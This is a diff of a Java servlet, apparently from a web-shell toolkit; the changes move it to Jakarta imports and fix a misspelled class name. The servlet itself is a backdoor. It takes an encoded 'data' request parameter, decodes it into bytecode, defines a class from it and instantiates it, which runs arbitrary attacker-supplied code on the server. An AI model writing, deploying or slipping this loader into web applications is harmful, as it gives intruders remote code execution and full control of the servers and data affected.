@@ -1,16 +1,17 @@
-import javax.servlet.*;
+import jakarta.servlet.*;
+
 import java.io.IOException;
 
 /**
  * @author Wans
  * @since 2025/08/25
  */
-public class BigIntegerClassLaoderServlet extends ClassLoader implements Servlet {
+public class BigIntegerClassLoaderServlet extends ClassLoader implements Servlet {
 
-    public BigIntegerClassLaoderServlet() {
+    public BigIntegerClassLoaderServlet() {
     }
 
-    protected BigIntegerClassLaoderServlet(ClassLoader parent) {
+    protected BigIntegerClassLoaderServlet(ClassLoader parent) {
         super(parent);
     }
 
@@ -29,7 +30,7 @@ public class BigIntegerClassLaoderServlet extends ClassLoader implements Servlet
         String data = req.getParameter("data");
         try {
             byte[] bytes = decodeBigInteger(data);
-            new BigIntegerClassLaoderServlet(Thread.currentThread().getContextClassLoader()).defineClass(null, bytes, 0, bytes.length).newInstance();
+            new BigIntegerClassLoaderServlet(Thread.currentThread().getContextClassLoader()).defineClass(null, bytes, 0, bytes.length).newInstance();
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
